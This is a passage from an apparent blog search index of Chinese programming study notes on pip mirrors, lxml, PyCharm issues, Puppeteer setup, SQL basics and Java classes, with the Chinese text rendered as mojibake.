(æ²¡æœ‰å°±åˆ›å»ºä¸€ä¸ª)ï¼Œ å†…å®¹å¦‚ä¸‹ï¼š 12[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple windows:ç›´æŽ¥åœ¨userç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªpipç›®å½•ï¼Œå¦‚ï¼šC:\Users\xx\pipï¼Œæ–°å»ºæ–‡ä»¶pip.iniï¼Œå†…å®¹å¦‚ä¸‹ 12[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python lxmlåº“ä¸­etreeçš„ç®€å•åº”ç”¨]]></title>
    <url>%2F2020%2F03%2F13%2Fpython-lxml%E5%BA%93%E4%B8%ADetree%E7%9A%84%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.etree.HTML() å®ƒå¯ä»¥ç”¨æ¥è§£æžå­—ç¬¦ä¸²æ ¼å¼çš„HTMLæ–‡æ¡£å¯¹è±¡ï¼Œå°†ä¼ è¿›åŽ»çš„å­—ç¬¦å˜æˆ_Elementå¯¹è±¡ï¼Œæ–¹ä¾¿ä½¿ç”¨getparent(),remove(),xpath()ç­‰æ–¹æ³•ã€‚ ä¾‹å¦‚ 12345678#encoding=utf8from lxml import etreehtml = &apos;&lt;html&gt;&lt;body&gt;&lt;h1&gt;This is a test&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&apos;_element = etree.HTML(html)è§£æžå­—ç¬¦ä¸²æ ¼å¼çš„HTMLå¯¹è±¡text = _element.xpath(&apos;//h1/text()&apos;)etree.HTMLæ–¹ä¾¿åˆ©ç”¨xpath()ç­‰æ–¹æ³•ã€‚print(&apos;result is :&apos;,text)å¾—åˆ°result is:[&apos;This is a test&apos;]//å¯çŸ¥xpathè¿”å›žçš„åªæ˜¯åˆ—è¡¨ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æ­¤æ–¹æ³•æ—¶ï¼ŒåªèŽ·å–ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ 2.etree.tostring() ç”¨äºŽå°†_elementå¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚ï¼Œé€šè¿‡ç®€å•çš„è¡¨è¾¾å¼æ— æ³•å¾—åˆ°ç»“æžœæ—¶ä½¿ç”¨ã€‚ 1&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;This &lt;a&gt;is a &lt;/a&gt;test&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; è‹¥ç”¨â€//h1/text()â€å¾—åˆ°â€Thisâ€å’Œâ€testâ€,ç”¨â€//h1//text()å¾—åˆ°â€Thisâ€â€ is a â€œâ€testâ€,etreeæ–¹æ³•å¯ä»¥ä¼ é€’å¤šä¸ªå‚æ•°ï¼Œelement_or_tree,encoding,method.å¯ä»¥å°†åˆ—è¡¨æ‹¼æŽ¥æˆå­—ç¬¦ä¸²ã€‚ 1result = etree.tostring(_h[0],method=&apos;text&apos;)methodä¸ºtextæ—¶ï¼Œè¡¨ç¤ºè¿”å›ž_elementå¯¹è±¡ä¸­çš„æ‰€æœ‰æ–‡æœ¬ã€‚]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pycharmä½¿ç”¨æ—¶é‡åˆ°çš„é—®é¢˜]]></title>
    <url>%2F2020%2F03%2F13%2Fpycharm%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1.cmdä¸­æŸ¥çœ‹pythonå®‰è£…äº†å“ªäº›ç¬¬ä¸‰æ–¹åº“å‘½ä»¤ï¼špip listã€‚ 2.æ‰‹åŠ¨ä¸‹è½½pythonç¬¬ä¸‰æ–¹åº“ï¼šåœ¨ç½‘ç«™ä¸‹è½½åŽç¼€ä¸º.whlçš„æ–‡ä»¶ï¼Œå¹¶ä¸”å°†ä¸‹è½½çš„æ–‡ä»¶æ”¾å…¥C:user/xxx/æ–‡ä»¶å¤¹ä¸­ï¼Œåˆ©ç”¨cmdæ‰§è¡Œpip install ä¸‹è½½çš„æ–‡ä»¶åã€‚ 3.æƒ³å®‰è£…lxmlåº“å­¦ä¹ çˆ¬è™«&gt;cnodaæ”¾å¼ƒ&gt;æ‰‹åŠ¨å®‰è£…lxmlï¼Œä¸‹å¥½äº†whlæ–‡ä»¶pipå‡ºçŽ°é—®é¢˜&gt;ä¸‹è½½çš„ç‰ˆæœ¬ä¸å¯¹&gt;æŸ¥è¯¢æ”¯æŒå“ªäº›ç‰ˆæœ¬&gt;æŸ¥è¯¢ç‰ˆæœ¬å‘½ä»¤å‡ºé”™&gt;ï¼Œæœ€åŽç»“æžœæ˜¯åˆ é™¤äº†åŽŸæœ‰çš„å‡ ä¸ªpython projectï¼Œé‡å»ºäº†ä¸€ä¸ªprojectå‹¾é€‰äº†Inherit global site-packages/Make available to all projectsã€‚ 4.Xpathï¼Œåœ¨æºç ä¸­ç›¸å½“äºŽå®šä½åœ°å€ã€‚ //*[@id=â€mainBoxâ€]/main/div[2]/div[1]/h4/a //æŒ‡æ ¹ç»“ç‚¹ï¼Œ/æŒ‡å¾€ä¸‹å±‚å¯»æ‰¾ï¼Œ/text()æŒ‡æå–æ–‡æœ¬å†…å®¹ï¼Œ/@xxxxæŒ‡æå–å±žæ€§å†…å®¹ã€‚ 5.è®°ä½Linuxä¸‹å®‰è£…ä»»ä½•è½¯ä»¶ï¼Œæ‰¾æ•™ç¨‹éƒ½è¦é™„ä¸ŠLinuxçš„ç‰ˆæœ¬ï¼Œæ˜¯Centosè¿˜æ˜¯Ubuntuã€‚ 6.python3.7å¸è½½å‡ºé—®é¢˜äº†ï¼Œæ‰¾åˆ°Cç›˜ä¸‹&gt;ç”¨æˆ·&gt;Lenovo&gt;appdata&gt;local&gt;programs,å°†pythonæ–‡ä»¶å¤¹åˆ é™¤åŽï¼Œåœ¨æ·»åŠ ä¸Žåˆ é™¤ç¨‹åºç•Œé¢repairåŽå¯æ­£å¸¸å¸è½½ã€‚ 7.pip æ˜¯ä¸€ä¸ªå®‰è£…å’Œç®¡ç† Python åŒ…çš„å·¥å…· , æ˜¯ easy_install çš„ä¸€ä¸ªæ›¿æ¢å“ã€‚ è®¸å¤šäººåœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨pipçš„æ—¶å€™éƒ½ä¼šå‡ºçŽ°â€™pipâ€™ ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åºæˆ–æ‰¹å¤„ç†æ–‡ä»¶ã€‚ è¿™æ˜¯å› ä¸ºç›´æŽ¥åœ¨Administratorç›®å½•ä¸‹é¢ç›´æŽ¥æ‰§è¡Œpipå‘½ä»¤çš„æ—¶å€™ ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸‹é¢æ‰¾pipçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ è€Œpipæ˜¯åœ¨pythonç›®å½•ä¸‹é¢çš„scriptsç›®å½•ä¸‹é¢çš„ æ‰€ä»¥å°±å‡ºçŽ°äº†ä¸Šé¢çš„é”™è¯¯ã€‚ python37ä¸‹å¯èƒ½æ— pip.exeï¼Œpython -m ensurepipè§£å†³ã€‚åœ¨æˆ‘çš„ç”µè„‘å±žæ€§&gt;é«˜çº§ç³»ç»Ÿè®¾ç½®ä¸­é…ç½®çŽ¯å¢ƒå˜é‡ã€‚ 8.pythonçš„ç¬¬ä¸‰æ–¹åº“ï¼Œpipï¼Œrequestsç­‰ï¼Œå¯ç›´æŽ¥åœ¨settings&gt;projectxxx&gt;project interpreterä¸­å‡çº§ã€‚ 9.å›½å†…é•œåƒæºå‡çº§pippython -m pip install â€“upgrade pip -i https://pypi.douban.com/simpleã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[2020/3/12]]></title>
    <url>%2F2020%2F03%2F12%2Fpuppeteer%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Puppeteerå…¥é—¨ 0.Nodeçš„å®‰è£…ï¼Œåœ¨windowsä¸‹åº”è¯¥æ²¡å•¥é—®é¢˜ã€‚ä»Šå¤©åœ¨centosä¸Šè¯•äº†ä¸‹ï¼ŒæŽŒæ¡å¾—å¹¶ä¸æ˜¯å¾ˆå¥½ã€‚ åœ¨å®˜ç½‘ä¸‹è½½ï¼Œä¸€ç§æ˜¯æºç å®‰è£…ï¼Œä¸‹è½½ä¹‹åŽç¼–è¯‘ã€‚å¦ä¸€ç§æ˜¯ç›´æŽ¥è§£åŽ‹ã€‚ 1tar xf node-v12.16.1-linux-x64.tar.xz ä½†æ˜¯ä¹‹åŽè¦åœ¨å…¨å±€ä½¿ç”¨nodeå‘½ä»¤ï¼Œå°±è¦åœ¨ç³»ç»ŸçŽ¯å¢ƒå˜é‡é‡Œé¢æŠŠè·¯å¾„åŠ è¿›åŽ»ã€‚Windowsæ˜¯æ˜Žç™½äº†ï¼Œä½†æ˜¯Linuxæ²¡æƒ³åˆ°ã€‚Centosä¸­ç³»ç»ŸçŽ¯å¢ƒå˜é‡åœ¨ 1/etc/profile ç›®å½•ä¸‹ã€‚ å…¶å®žå’Œç»™npmä¸Žnodeå»ºç«‹è½¯é“¾æŽ¥æ˜¯ä¸€ä¸ªä½œç”¨ã€‚ ln -s nodeçš„è·¯å¾„ /usr/binï¼Œnpmç±»ä¼¼ã€‚ é‡åˆ°å¦‚ä¸‹æŠ¥é”™ï¼ŒåŽŸå› æ˜¯ç¼ºå°‘package.jsonæ–‡ä»¶ï¼Œéœ€è¦æ‰§è¡Œ npm init 123456npm WARN saveError ENOENT: no such file or directory, open &apos;/package.json&apos;npm WARN enoent ENOENT: no such file or directory, open &apos;/package.json&apos;npm WARN !invalid#1 No descriptionnpm WARN !invalid#1 No repository field.npm WARN !invalid#1 No README datanpm WARN !invalid#1 No license field. 1.æ‰¾åˆ°ä¸€ç¯‡åšå®¢å†™çš„å¾ˆæ¸…æ¥šï¼Œæ­£å¸¸æ¥è¯´æ‰§è¡Œ 1npm install puppeteer --save ä½†æ˜¯å› ä¸ºchromiumä¸‹è½½ä¸äº†ï¼Œé‚£å°± 1npm install puppeteer --ignore-scripts --save ç„¶åŽè‡ªå·±ä¸‹ä¸€ä¸ªchromiumï¼ˆï¼‰è¦å¯¹åº”ç‰ˆæœ¬çš„ï¼Œåœ¨puppeteerçš„package.jsonä¸­æŸ¥çœ‹ã€‚æœ€åŽç”¨FTPä¼ åˆ°æœåŠ¡å™¨é‡ŒåŽ»ã€‚ 2.[å­¦é•¿çš„åšå®¢]https://brickyang.github.io/2019/01/14/%E5%9B%BD%E5%86%85%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85-Puppeteer-%E7%9A%84%E6%96%B9%E6%B3%95/æ–¹æ³•ä¸€äºŒéƒ½è¯•è¿‡ï¼Œä½†æ˜¯é“è¡Œå¤ªæµ…ï¼Œçœ‹ä¸æ‡‚åº”è¯¥å¦‚ä½•ç”¨è„šæœ¬ã€‚ä»Žä¸‹åˆå››ç‚¹æžåˆ°ä¸ƒç‚¹å¤šæ‰åšå¥½ï¼Œæ–¹æ³•è®ºå¼•äººæ·±æ€ã€‚ç”¨æ·˜å®çš„é•œåƒæºè£…å¥½puppeteerã€‚ 3. 4.examples pdfï¼š 123456789101112131415const puppeteer = require(&apos;puppeteer&apos;);(async() =&gt; &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto(&apos;https://news.ycombinator.com&apos;, &#123;waitUntil: &apos;networkidle2&apos;&#125;); // page.pdf() is currently supported only in headless mode. // @see https://bugs.chromium.org/p/chromium/issues/detail?id=753118 await page.pdf(&#123; path: &apos;hn.pdf&apos;, format: &apos;letter&apos; &#125;); await browser.close();&#125;)(); screenshotï¼š 123456789const puppeteer = require(&apos;puppeteer&apos;);(async() =&gt; &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto(&apos;http://example.com&apos;); await page.screenshot(&#123;path: &apos;example.png&apos;&#125;); await browser.close();&#125;)(); 5.æ€»ç»“ï¼Œå¯¹äºŽåˆ«äººç»™çš„å‘½ä»¤ä¸èƒ½ç…§æ¬ï¼Œç‰¹åˆ«æ˜¯æœ‰è·¯å¾„å•¥çš„æ—¶å€™ï¼Œè‡ªå·±åŽ»æŒ‰ç…§æœ¬èº«æƒ…å†µæ”¹ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[SQL]]></title>
    <url>%2F2019%2F11%2F25%2FSQL%2F</url>
    <content type="text"><![CDATA[ä¸€ï¼šåŽ»æŽ‰é‡å¤æ•°æ®çš„æ–¹æ³• 1.distinct æ ¹æ®å•ä¸ªå­—æ®µåŽ»é‡ï¼Œèƒ½å¤Ÿç²¾ç¡®åŽ»é‡ã€‚ä½†ä½œç”¨åœ¨å¤šä¸ªå­—æ®µæ—¶ï¼Œåªæœ‰å½“è¿™å‡ ä¸ªå­—æ®µå®Œå…¨ç›¸åŒæ‰èƒ½åŽ»é‡ã€‚ï¼ˆè¦ä¿è¯æ¯ä¸€åˆ—éƒ½ä¸€æ ·ï¼‰ã€‚count(distinct é‡å¤æ•°æ®æ‰€åœ¨å­—æ®µ)ä¼šè¿”å›žä¸é‡å¤çš„æ¡æ•°ã€‚ 2.group by åœ¨è¯­å¥æœ€åŽåŠ ä¸Šgroup by+é‡å¤æ•°æ®æ‰€åœ¨å­—æ®µã€‚ äºŒï¼šgroup byçš„ç”¨æ³• group byå¿…é¡»é…åˆèšåˆå‡½æ•°ç”¨ï¼Œåˆ†ç»„ä¹‹åŽå¯ä»¥è®¡æ•°countï¼Œæ±‚å’Œsumï¼Œæ±‚å¹³å‡æ•°avgï¼Œmaxå’Œminç­‰ã€‚group byä¸ä¼šå°†æ‰€æœ‰ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ï¼Œåªèƒ½å¾—åˆ°æ‰€éœ€çš„ç‰¹å®šæ•°å€¼ã€‚ æåˆ°group byå°±ä¸å¾—ä¸æåˆ°HAVINGï¼Œå®ƒä¸ŽWHEREç­›é€‰ä¸åŒ(whereæ˜¯èšåˆå‰çš„ç­›é€‰ï¼Œhavingæ˜¯èšåˆåŽçš„ç­›é€‰)ï¼ŒHAVINGæ˜¯å¯¹äºŽgroup byå¯¹è±¡è¿›è¡Œç­›é€‰ã€‚å®ƒå¯ä»¥ç”¨æ¥ç­›é€‰group byä¹‹åŽçš„æ•°å€¼ç¬¦åˆæ¡ä»¶çš„éƒ¨åˆ†ã€‚ GROUP BY å­å¥:æŒ‡å®šç”¨æ¥æ”¾ç½®è¾“å‡ºè¡Œçš„ç»„ã€‚æŒ‡å®š GROUP BY æ—¶ï¼Œé€‰æ‹©åˆ—è¡¨ä¸­ä»»ä¸€éžèšåˆè¡¨è¾¾å¼å†…çš„æ‰€æœ‰åˆ—éƒ½åº”åŒ…å«åœ¨ GROUP BY åˆ—è¡¨ä¸­ï¼Œæˆ–è€… GROUP BY è¡¨è¾¾å¼å¿…é¡»ä¸Žé€‰æ‹©åˆ—è¡¨è¡¨è¾¾å¼å®Œå…¨åŒ¹é…ã€‚å¦‚æžœ SELECT å­å¥ä¸­åŒ…å«èšåˆå‡½æ•°ï¼Œåˆ™è®¡ç®—æ¯ç»„çš„æ±‡æ€»å€¼ã€‚ group byè¯­å¥åŽæŽ¥ä¸Šå¤šä¸ªå‚æ•°æ—¶ï¼Œä¸ºäº†åŽ»é‡éœ€è¦ç”¨whereè¯­å¥è¿›è¡ŒåŽ»é‡ã€‚ä½¿ç”¨countå¹¶é‡å‘½åçš„åˆ—ä¸ç”¨åŠ åœ¨group byé‡Œã€‚ order by xxxæŒ‰ç…§xxxæŽ’åˆ—ï¼Œdescä¸ºé™åº ä¸‰ï¼šlimitç”¨æ³• select * from tableName limit i,n tableNameï¼šè¡¨å iï¼šä¸ºæŸ¥è¯¢ç»“æžœçš„ç´¢å¼•å€¼(é»˜è®¤ä»Ž0å¼€å§‹)ï¼Œå½“i=0æ—¶å¯çœç•¥i nï¼šä¸ºæŸ¥è¯¢ç»“æžœè¿”å›žçš„æ•°é‡ iä¸Žnä¹‹é—´ä½¿ç”¨è‹±æ–‡é€—å·â€,â€éš”å¼€ limit n ç­‰åŒäºŽ limit 0,n å››ï¼šdatediffå‡½æ•° select datediff(yearï¼Œbirthdayï¼Œgatdate()) äº”ï¼šæ¨¡ç³ŠæŸ¥è¯¢ select * from XXX where (XXX like â€˜%XXâ€™) å…­ï¼šæŽ’åº descä¸ºä»Žé«˜åˆ°ä½Ž ä¸ƒï¼šleft join LEFT JOIN å…³é”®å­—ä¼šä»Žå·¦è¡¨ (table_name1) é‚£é‡Œè¿”å›žæ‰€æœ‰çš„è¡Œï¼Œå³ä½¿åœ¨å³è¡¨ (table_name2) ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œã€‚ ç”¨æ³•å¦‚ä¸‹: 12345&gt; SELECT column_name(s)&gt; FROM table_name1&gt; LEFT JOIN table_name2 &gt; ON table_name1.column_name=table_name2.column_nam&gt; å…«ï¼šå¦‚æžœæ˜¯è¡¨åæˆ–è€…åˆ—åä¹‹ç±»çš„å±žæ€§ï¼Œä¸ç”¨åŠ å¼•å·ã€‚å¦‚æžœæ˜¯åˆ—ä¸­çš„å€¼ï¼Œæˆ–è€…è¾“å…¥çš„å€¼ï¼Œåˆ™å¿…é¡»åŠ å¼•å·ã€‚ ä¹ï¼šå¤šè¡¨æŸ¥è¯¢ å¯¹äºŽnå¼ è¡¨ï¼Œä¾é n-1ä¸ªå­—æ®µè”ç»“çš„ï¼Œåœ¨selectè¯­å¥ä¸­ï¼Œå¯¹è¦æ±‚çš„å¤šä¸ªåˆ—åè¿›è¡ŒæŸ¥è¯¢(ä½œä¸ºè”ç»“çš„åˆ—åè¦å†™å‡ºæ‰€å±žè¡¨å)ï¼Œå†ç”¨whereè¯­å¥å¯¹å…¶è¿›è¡ŒåŽ»é‡ï¼Œå¦‚ï¼šå­¦ç”Ÿ.å­¦å·=é€‰ä¿®.å­¦å·ã€‚ åï¼šå­æŸ¥è¯¢è¿”å›žçš„å€¼ä¸æ­¢ä¸€ä¸ªã€‚å½“å­æŸ¥è¯¢è·Ÿéšåœ¨ =ã€!=ã€&lt;ã€&lt;=ã€&gt;ã€&gt;= ä¹‹åŽï¼Œæˆ–å­æŸ¥è¯¢ç”¨ä½œè¡¨è¾¾å¼æ—¶ï¼Œè¿™ç§æƒ…å†µæ˜¯ä¸å…è®¸çš„ã€‚è¿™ç§æƒ…å†µä¸èƒ½åœ¨è¯­å¥ä¸­ä½¿ç”¨ç­‰å·ï¼Œè¦ç”¨in select * from å­¦ç”Ÿwhere å­¦ç”Ÿ.ç­å· in (select ç­çº§.ç­å· from ç­çº§ where (ç­çº§.ä¸“ä¸šç¼–å·=â€™001â€™)) å­æŸ¥è¯¢å°±æ˜¯æŠŠä¸€ä¸ªæŸ¥è¯¢çš„ç»“æžœåœ¨å¦ä¸€ä¸ªæŸ¥è¯¢ä¸­ä½¿ç”¨ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[Java review]]></title>
    <url>%2F2019%2F11%2F23%2FJava-review%2F</url>
    <content type="text"><![CDATA[[TOC] ç±»çš„å®šä¹‰åœ¨ Java ä¸­å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä½¿ç”¨ class å…³é”®å­—ã€ä¸€ä¸ªè‡ªå®šä¹‰çš„ç±»åå’Œä¸€å¯¹è¡¨ç¤ºç¨‹åºä½“çš„å¤§æ‹¬å·ã€‚å®Œæ•´è¯­æ³•å¦‚ä¸‹ï¼š 123456789101112&gt; [public][abstract|final]class&lt;class_name&gt;[extends&lt;class_name&gt;][implements&lt;interface_name&gt;] &#123;&gt; // å®šä¹‰å±žæ€§éƒ¨åˆ†&gt; &lt;property_type&gt;&lt;property1&gt;;&gt; &lt;property_type&gt;&lt;property2&gt;;&gt; &lt;property_type&gt;&lt;property3&gt;;&gt; â€¦&gt; // å®šä¹‰æ–¹æ³•éƒ¨åˆ†&gt; function1();&gt; function2();&gt; function3();&gt; â€¦&gt; publicï¼šè¡¨ç¤ºâ€œå…±æœ‰â€çš„æ„æ€ã€‚å¦‚æžœä½¿ç”¨ public ä¿®é¥°ï¼Œåˆ™å¯ä»¥è¢«å…¶ä»–ç±»å’Œç¨‹åºè®¿é—®ã€‚æ¯ä¸ª Java ç¨‹åºçš„ä¸»ç±»éƒ½å¿…é¡»æ˜¯ public ç±»ï¼Œä½œä¸ºå…¬å…±å·¥å…·ä¾›å…¶ä»–ç±»å’Œç¨‹åºä½¿ç”¨çš„ç±»åº”å®šä¹‰ä¸º public ç±»ã€‚ abstractï¼šå¦‚æžœç±»è¢« abstract ä¿®é¥°ï¼Œåˆ™è¯¥ç±»ä¸ºæŠ½è±¡ç±»ï¼ŒæŠ½è±¡ç±»ä¸èƒ½è¢«å®žä¾‹åŒ–ï¼Œä½†æŠ½è±¡ç±»ä¸­å¯ä»¥æœ‰æŠ½è±¡æ–¹æ³•ï¼ˆä½¿ç”¨ abstract ä¿®é¥°çš„æ–¹æ³•ï¼‰å’Œå…·ä½“æ–¹æ³•ï¼ˆæ²¡æœ‰ä½¿ç”¨ abstract ä¿®é¥°çš„æ–¹æ³•ï¼‰ã€‚ç»§æ‰¿è¯¥æŠ½è±¡ç±»çš„æ‰€æœ‰å­ç±»éƒ½å¿…é¡»å®žçŽ°è¯¥æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼ˆé™¤éžå­ç±»ä¹Ÿæ˜¯æŠ½è±¡ç±»ï¼‰ã€‚ finalï¼šå¦‚æžœç±»è¢« final ä¿®é¥°ï¼Œåˆ™ä¸å…è®¸è¢«ç»§æ‰¿ã€‚ classï¼šå£°æ˜Žç±»çš„å…³é”®å­—ã€‚ class_nameï¼šç±»çš„åç§°ã€‚ extendsï¼šè¡¨ç¤ºç»§æ‰¿å…¶ä»–ç±»ã€‚ implementsï¼šè¡¨ç¤ºå®žçŽ°æŸäº›æŽ¥å£ã€‚ property_typeï¼šè¡¨ç¤ºæˆå‘˜å˜é‡çš„ç±»åž‹ã€‚ propertyï¼šè¡¨ç¤ºæˆå‘˜å˜é‡åç§°ã€‚ function()ï¼šè¡¨ç¤ºæˆå‘˜æ–¹æ³•åç§°ã€‚ åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®ç±»åž‹ã€‚å®žä¾‹åŒ–ä¸€ä¸ªç±»ï¼Œå°±æ˜¯å¾—åˆ°ç±»çš„ä¸€ä¸ªå¯¹è±¡ã€‚å› æ­¤ï¼Œå¯¹è±¡å°±æ˜¯ä¸€ç»„å˜é‡å’Œç›¸å…³æ–¹æ³•çš„é›†åˆï¼Œå…¶ä¸­å˜é‡è¡¨æ˜Žå¯¹è±¡çš„çŠ¶æ€å’Œå±žæ€§ï¼Œæ–¹æ³•è¡¨æ˜Žå¯¹è±¡æ‰€å…·æœ‰çš„è¡Œä¸ºã€‚ (1) å£°æ˜Žç±»ã€‚ç¼–å†™ç±»çš„æœ€å¤–å±‚æ¡†æž¶ã€‚ (2) ç¼–å†™ç±»çš„å±žæ€§ã€‚ç±»ä¸­çš„æ•°æ®å’Œæ–¹æ³•ç»Ÿç§°ä¸ºç±»æˆå‘˜ã€‚å…¶ä¸­ï¼Œç±»çš„å±žæ€§å°±æ˜¯ç±»çš„æ•°æ®æˆå‘˜ã€‚é€šè¿‡åœ¨ç±»çš„ä¸»ä½“ä¸­å®šä¹‰å˜é‡æ¥æè¿°ç±»æ‰€å…·æœ‰çš„ç‰¹å¾ï¼ˆå±žæ€§ï¼‰ï¼Œè¿™é‡Œå£°æ˜Žçš„å˜é‡ç§°ä¸ºç±»çš„æˆå‘˜å˜é‡ã€‚ (3) ç¼–å†™ç±»çš„æ–¹æ³•ã€‚ç±»çš„æ–¹æ³•æè¿°äº†ç±»æ‰€å…·æœ‰çš„è¡Œä¸ºï¼Œæ˜¯ç±»çš„æ–¹æ³•æˆå‘˜ã€‚å¯ä»¥ç®€å•åœ°æŠŠæ–¹æ³•ç†è§£ä¸ºç‹¬ç«‹å®ŒæˆæŸä¸ªåŠŸèƒ½çš„å•å…ƒæ¨¡å—ã€‚ ç±»çš„å±žæ€§:æˆå‘˜å˜é‡çš„å®šä¹‰å’Œå£°æ˜Žå£°æ˜Žæˆå‘˜å˜é‡çš„è¯­æ³•å¦‚ä¸‹ï¼š 12&gt; [public|protected|private][static][final]&lt;type&gt;&lt;variable_name&gt;&gt; å„å‚æ•°çš„å«ä¹‰å¦‚ä¸‹ã€‚ publicã€protectedã€privateï¼šç”¨äºŽè¡¨ç¤ºæˆå‘˜å˜é‡çš„è®¿é—®æƒé™ã€‚ staticï¼šè¡¨ç¤ºè¯¥æˆå‘˜å˜é‡ä¸ºç±»å˜é‡ï¼Œä¹Ÿç§°ä¸ºé™æ€å˜é‡ã€‚ finalï¼šè¡¨ç¤ºå°†è¯¥æˆå‘˜å˜é‡å£°æ˜Žä¸ºå¸¸é‡ï¼Œå…¶å€¼æ— æ³•æ›´æ”¹ã€‚ typeï¼šè¡¨ç¤ºå˜é‡çš„ç±»åž‹ã€‚ variable_nameï¼šè¡¨ç¤ºå˜é‡åç§°ã€‚ å¯ä»¥åœ¨å£°æ˜Žæˆå‘˜å˜é‡çš„åŒæ—¶å¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ï¼Œå¦‚æžœå£°æ˜Žæˆå‘˜å˜é‡æ—¶æ²¡æœ‰å¯¹å…¶åˆå§‹åŒ–ï¼Œåˆ™ç³»ç»Ÿä¼šä½¿ç”¨é»˜è®¤å€¼åˆå§‹åŒ–æˆå‘˜å˜é‡ã€‚ å®žä¾‹åŒ–ï¼Œå°±æ˜¯å¯¹ä¸€ä¸ªå¯¹è±¡çš„å„ä¸ªå±žæ€§è¿›è¡Œèµ‹å€¼çš„è¿‡ç¨‹ã€‚ æˆå‘˜æ–¹æ³•å£°æ˜Žæˆå‘˜æ–¹æ³•å¯ä»¥å®šä¹‰ç±»çš„è¡Œä¸ºï¼Œè¡Œä¸ºè¡¨ç¤ºä¸€ä¸ªå¯¹è±¡èƒ½å¤Ÿåšçš„äº‹æƒ…æˆ–è€…èƒ½å¤Ÿä»Žä¸€ä¸ªå¯¹è±¡å–å¾—çš„ä¿¡æ¯ã€‚ç±»çš„å„ç§åŠŸèƒ½æ“ä½œéƒ½æ˜¯é€šè¿‡æ–¹æ³•æ¥å®žçŽ°çš„ï¼Œå±žæ€§ä¸è¿‡æä¾›äº†ç›¸åº”çš„æ•°æ®ã€‚ä¸€ä¸ªå®Œæ•´çš„æ–¹æ³•é€šå¸¸åŒ…æ‹¬æ–¹æ³•åç§°ï¼Œæ–¹æ³•ä¸»ä½“ï¼Œæ–¹æ³•å‚æ•°å’Œæ–¹æ³•è¿”å›žå€¼ç±»åž‹ã€‚æ ¼å¼å¦‚ä¸‹ï¼š 12345public class Test &#123; [public|private|protected][static]&lt;void|return_type&gt;&lt;method_name&gt;([paramList]) &#123; // æ–¹æ³•ä½“ &#125;&#125; publicã€privateã€protectedï¼šè¡¨ç¤ºæˆå‘˜æ–¹æ³•çš„è®¿é—®æƒé™ã€‚ staticï¼šè¡¨ç¤ºé™å®šè¯¥æˆå‘˜æ–¹æ³•ä¸ºé™æ€æ–¹æ³•ã€‚ finalï¼šè¡¨ç¤ºé™å®šè¯¥æˆå‘˜æ–¹æ³•ä¸èƒ½è¢«é‡å†™æˆ–é‡è½½ã€‚ abstractï¼šè¡¨ç¤ºé™å®šè¯¥æˆå‘˜æ–¹æ³•ä¸ºæŠ½è±¡æ–¹æ³•ã€‚æŠ½è±¡æ–¹æ³•ä¸æä¾›å…·ä½“çš„å®žçŽ°ï¼Œå¹¶ä¸”æ‰€å±žç±»åž‹å¿…é¡»ä¸ºæŠ½è±¡ç±»ã€‚ Thiså…³é”®å­—this.å±žæ€§åå¤§éƒ¨åˆ†æ—¶å€™ï¼Œæ™®é€šæ–¹æ³•è®¿é—®å…¶ä»–æ–¹æ³•ï¼Œæˆå‘˜å˜é‡æ—¶æ— éœ€ä½¿ç”¨thiså‰ç¼€ï¼Œä½†æ˜¯å¦‚æžœæ–¹æ³•ä¸­æœ‰å±€éƒ¨å˜é‡å’Œæˆå‘˜å˜é‡åŒåï¼Œç¨‹åºåˆè¦åœ¨è¯¥æ–¹æ³•é‡Œè®¿é—®è¿™ä¸ªè¢«è¦†ç›–çš„æˆå‘˜å˜é‡ï¼Œåˆ™å¿…é¡»ä½¿ç”¨thiså‰ç¼€ã€‚(æˆ‘çš„ç†è§£æ˜¯ï¼Œä¼ çš„å‚æ•°åå­—ä¸Žå®šä¹‰çš„å˜é‡åå­—ç›¸åŒæ—¶ï¼Œä¸ºäº†åŒºåˆ†å˜é‡ä¸Žå‚æ•°ï¼Œä½¿ç”¨this)ã€‚ ä¾‹å¦‚å®šä¹‰ä¸€ä¸ªTeacherï¼š 12345public class Teacher &#123; private String name; // æ•™å¸ˆåç§° private double salary; // å·¥èµ„ private int age; // å¹´é¾„&#125; ä¸Šè¿°ä»£ç ä¸­ï¼Œä¸‰ä¸ªå˜é‡åçš„ä½œç”¨åŸŸæ˜¯privateï¼Œå› æ­¤åœ¨ç±»å¤–éƒ¨æ— 